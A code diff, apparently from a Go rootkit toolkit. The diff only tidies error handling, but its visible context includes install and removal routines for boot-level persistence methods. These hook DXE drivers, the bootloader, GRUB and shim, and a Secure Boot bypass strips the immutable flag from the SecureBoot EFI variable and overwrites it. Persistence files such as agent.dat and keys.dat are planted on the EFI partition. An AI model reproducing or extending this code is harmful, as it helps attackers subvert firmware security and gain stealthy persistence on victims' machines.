@@ -58,7 +58,7 @@ func (m *DXEDriverMethod) Install(config *RootkitConfig) (*RootkitResult, error)
 	}
 
 	cmd = exec.Command("chmod", "444", driverPath)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &RootkitResult{
 		Success:   true,
@@ -86,9 +86,9 @@ func (m *DXEDriverMethod) Remove(config *RootkitConfig) error {
 		if output, err := cmd.CombinedOutput(); err != nil {
 			return fmt.Errorf("failed to restore original driver: %w: %s", err, string(output))
 		}
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 	} else {
-		os.Remove(driverPath)
+		_ = os.Remove(driverPath)
 	}
 
 	return nil
@@ -164,7 +164,7 @@ func (m *BootChainHookMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, bootx64Path)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
@@ -247,7 +247,7 @@ func (m *OSLHookMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, grubPath)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
@@ -319,7 +319,7 @@ func (m *CMHookMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, cmPath)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
@@ -366,11 +366,11 @@ func (m *SecureBootBypassMethod) Install(config *RootkitConfig) (*RootkitResult,
 
 	variantPath := "/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c"
 	cmd = exec.Command("chattr", "-i", variantPath)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	cmd = exec.Command("tee", variantPath)
 	cmd.Stdin = strings.NewReader("\x07\x00\x00\x00\x00")
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &RootkitResult{
 		Success:   true,
@@ -529,7 +529,7 @@ func (m *UEFISelfReinstallMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, selfPath)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
@@ -607,7 +607,7 @@ func (m *ESPPersistenceMethod) Remove(config *RootkitConfig) error {
 
 	persistFiles := []string{"agent.dat", "config.dat", "keys.dat", "fstab.persist"}
 	for _, f := range persistFiles {
-		os.Remove(filepath.Join(espPath, "EFI", "BOOT", f))
+		_ = os.Remove(filepath.Join(espPath, "EFI", "BOOT", f))
 	}
 
 	return nil
@@ -690,11 +690,11 @@ func (m *ShimExploitMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, shimPath)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
-	os.Remove(filepath.Join(espPath, "EFI", "ubuntu", ".shim_marker"))
+	_ = os.Remove(filepath.Join(espPath, "EFI", "ubuntu", ".shim_marker"))
 	return os.Remove(shimPath)
 }
 
